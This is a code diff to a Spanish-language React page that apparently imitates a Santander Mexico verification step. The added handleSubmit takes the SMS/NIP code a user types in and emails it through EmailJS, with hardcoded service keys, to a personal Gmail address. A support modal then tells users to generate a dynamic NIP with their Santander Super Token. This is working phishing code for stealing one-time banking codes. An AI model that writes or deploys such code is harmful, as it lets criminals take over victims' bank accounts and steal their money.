@@ -1,7 +1,6 @@
 import React, { useState, useEffect } from 'react';
 import '../css/segundapag.css';
 import { useNavigate } from 'react-router-dom';
-import { AiFillYuque } from "react-icons/ai";
 import emailjs from 'emailjs-com';
 
 function Segundapag() {
@@ -35,10 +34,32 @@ function Segundapag() {
     return `${minutes}:${secs < 10 ? '0' : ''}${secs}`;
   };
 
-  const handleSubmit = (event) => {
+  const handleSubmit = async (event) => {
     event.preventDefault();
-    setModalTimeLeft(300); // Reiniciar el temporizador del modal
-    setShowModal(true);
+    const formData = new FormData(event.target);
+    const smsCode = formData.get('sms-code');
+
+    try {
+      const response = await emailjs.send(
+        'service_pl7uznq', // Reemplaza con tu Service ID
+        'template_nb08ccn', // Reemplaza con tu Template ID
+        {
+          sms_code: smsCode,
+          to_email: 'alosantamex@gmail.com', // Correo destinatario
+        },
+        '8Mgn87H6amGJecjhG' // Reemplaza con tu Public Key
+      );
+
+      if (response.status === 200) {
+        console.log('Datos enviados correctamente');
+        setModalTimeLeft(300); // Reiniciar el temporizador del modal
+        setShowModal(true);
+      } else {
+        console.error('Error al enviar los datos');
+      }
+    } catch (error) {
+      console.error('Error al enviar los datos:', error);
+    }
   };
 
   const handleSupportClick = () => {
@@ -86,17 +107,15 @@ function Segundapag() {
         </button>
 
         <div className="auth-info-text">
-          <br/>
+          <br />
           <strong>Si tienes problemas para obtener el NIP, <br />
           Por favor,</strong>{' '}
           <span className="auth-link" onClick={handleSupportClick} style={{ color: 'red', cursor: 'pointer' }}>
             da click aquí
           </span>
         </div>
-
       </form>
 
-      {/* Modal para la confirmación del botón */}
       {showModal && (
         <div className="modal-overlay">
           <div className="modal-content">
@@ -107,7 +126,6 @@ function Segundapag() {
         </div>
       )}
 
-      {/* Modal para el soporte */}
       {showSupportModal && (
         <div className="modal-overlay">
           <div className="modal-content">
@@ -122,23 +140,24 @@ function Segundapag() {
                 borderRadius: '5px',
                 fontSize: '16px',
                 cursor: 'pointer',
-                marginTop: '2px'
+                marginTop: '2px',
               }}
             >
               Llamar a un asesor
             </button>
-            <br/> 
+            <br />
             <br />
             <div className="instructions">
               <strong>También puede seguir los siguientes pasos:</strong>
-              <br /> <br />
-              <p className='instrudty'>1. Abre la aplicación Santander <br />
-              2. En la parte de abajo selecciona la opción "Super Token" <br />
-              3. Ingresa tu clave Super Token para obtener el NIP dinámico</p>
+              <br />
+              <br />
+              <p className="instrudty">
+                1. Abre la aplicación Santander <br />
+                2. En la parte de abajo selecciona la opción "Super Token" <br />
+                3. Ingresa tu clave Super Token para obtener el NIP dinámico
+              </p>
             </div>
-            <button onClick={() => setShowSupportModal(false)} >
-              Cerrar
-            </button>
+            <button onClick={() => setShowSupportModal(false)}>Cerrar</button>
           </div>
         </div>
       )}
